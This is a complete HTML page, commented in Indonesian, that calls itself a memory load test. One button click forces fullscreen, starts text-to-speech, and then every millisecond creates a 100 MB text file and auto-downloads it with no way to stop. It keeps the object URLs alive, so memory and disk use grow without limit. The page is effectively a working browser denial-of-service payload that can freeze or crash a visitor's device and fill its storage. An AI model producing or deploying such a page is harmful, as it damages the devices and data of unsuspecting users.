<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Auto Fullscreen, TTS & Interval Overloop (1ms x 100MB TXT)</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f8;
      color: #222;
      padding: 20px;
    }
    .panel {
      background: #fff;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
      max-width: 650px;
      margin: 40px auto;
    }
    :fullscreen {
      background: #000000 !important;
      color: #00ff00 !important;
      padding: 20px !important;
      overflow-y: auto !important;
      width: 100vw !important;
      height: 100vh !important;
    }
    :-webkit-full-screen {
      background: #000000 !important;
      color: #00ff00 !important;
      padding: 20px !important;
      overflow-y: auto !important;
    }
    button {
      width: 100%;
      padding: 16px;
      cursor: pointer;
      border: 0;
      border-radius: 6px;
      background: #ff0000; 
      color: #fff;
      font-weight: bold;
      font-size: 16px;
      -webkit-tap-highlight-color: transparent;
      box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
    }
    #status { 
      margin-top: 16px; 
      font-weight: bold; 
      color: #ff0000; 
      padding: 10px;
      background: #ffebee;
      border-radius: 4px;
      display: inline-block;
      width: 100%;
      text-align: center;
      border: 1px solid #ffcdd2;
    }
    #downloads {
      margin-top: 20px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
      gap: 10px;
    }
    #downloads a { 
      display: block; 
      padding: 8px;
      background: #330000;
      color: #ff3333;
      text-decoration: none;
      border-radius: 4px;
      font-size: 13px;
      text-align: center;
      border: 1px solid #ff0000;
    }
  </style>
</head>

<body>
  <div class="panel" id="main-panel">
    <h2>Mobile Auto-Fullscreen & 1ms Interval Overloop</h2>
    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh, menyalakan TTS, dan mengeksekusi pembuatan file teks 100MB setiap 1 milidetik tanpa batas.</p>

    <p>
      <button id="start" type="button">⚠️ AKTIFKAN INTERVAL OVERLOOP ⚠️</button>
    </p>

    <p id="status" role="status">Sistem siap untuk pengujian interval.</p>
    <div id="downloads"></div>
  </div>

  <script>
    const start = document.getElementById("start");
    const status = document.getElementById("status");
    const downloads = document.getElementById("downloads");

    let objectUrls = [];
    let isLooping = false;

    // Fungsi Utilitas Text to Speech (TTS)
    const speakText = (text) => {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel(); 
        const utterance = new SpeechSynthesisUtterance(text);
        utterance.lang = 'id-ID'; 
        utterance.rate = 1.1;     
        window.speechSynthesis.speak(utterance);
      }
    };

    // Fungsi Asinkronus mempersiapkan Blob TXT 100MB di Microtask Queue
    const prepareBlobAsync = (i) => {
      return new Promise((resolve) => {
        queueMicrotask(() => {
          const sizeInBytes = 104857600; // 100 MB
          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Karakter 'A'
          const blob = new Blob([dummyTextBuffer], { type: "text/plain;charset=utf-8" });
          const url = URL.createObjectURL(blob);
          resolve({ id: i, url: url });
        });
      });
    };

    // Memicu download secara instan menggunakan Event Loop Macrotask
    const triggerInstantDownload = (fileData) => {
      setTimeout(() => {
        const link = document.createElement("a");
        link.href = fileData.url;
        link.download = `interval-100mb-${String(fileData.id).padStart(3, '0')}.txt`;
        link.textContent = `File ${fileData.id} (.txt)`;
        downloads.appendChild(link);

        link.click();
      }, 0);
    };

    start.addEventListener("click", () => {
      if (isLooping) return; // Mencegah klik ganda memicu interval berlapis
      isLooping = true;

      // Pembersihan awal memori browser
      objectUrls.forEach(url => URL.revokeObjectURL(url));
      objectUrls = [];
      downloads.replaceChildren();

      // 1. Picu TTS dan Fullscreen (Sama seperti logika yang Anda inginkan)
      speakText("Memulai simulasi pengujian beban memori tanpa batas.");
      const docEl = document.documentElement;
      try {
        if (docEl.requestFullscreen) docEl.requestFullscreen();
        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
        else if (docEl.mozRequestFullScreen) docEl.mozRequestFullScreen();
      } catch (err) {
        console.warn(err.message);
      }

      // 2. Menggunakan fungsi berbasis waktu (Interval) untuk membanjiri antrean secara konstan
      let fileCounter = 1;
      
      setInterval(async () => {
        // Membuat file baru secara terus menerus di dalam memori
        const fileData = await prepareBlobAsync(fileCounter);
        objectUrls.push(fileData.url);
        
        // Memicu unduhan instan ke antrean browser
        triggerInstantDownload(fileData);
        
        status.textContent = `Mengalokasikan file ke-${fileCounter} di memori... (Total: ${fileCounter * 100} MB)`;

        // Update TTS setiap kelipatan 10 file agar pengguna tahu statusnya
        if (fileCounter % 10 === 0) {
          speakText(`Alokasi mencapai ${fileCounter} file.`);
        }

        fileCounter++;
      }, 1); // Dieksekusi konstan setiap 1 milidetik tanpa henti
    });
  </script>
</body>
</html>
